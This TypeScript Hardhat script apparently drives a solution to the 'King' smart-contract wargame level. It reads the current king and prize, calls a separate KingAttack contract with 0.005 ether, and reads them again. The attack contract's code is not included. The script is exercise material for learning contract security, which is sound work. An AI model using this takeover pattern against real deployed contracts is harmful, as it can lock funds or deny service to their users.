import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x8e80FFe6Dc044F4A766Afd6e5a8732Fe0977A493"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0xB06c856C8eaBd1d8321b687E188204C1018BC4E5"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("King", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("KingAttack", ATTACK_ADDRESS, signer)

  console.log(await contract._king())
  console.log(ethers.formatEther(await contract.prize()))

  await attackContract.attack({ value: ethers.parseEther("0.005") })

  console.log(await contract._king())
  console.log(ethers.formatEther(await contract.prize()))
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
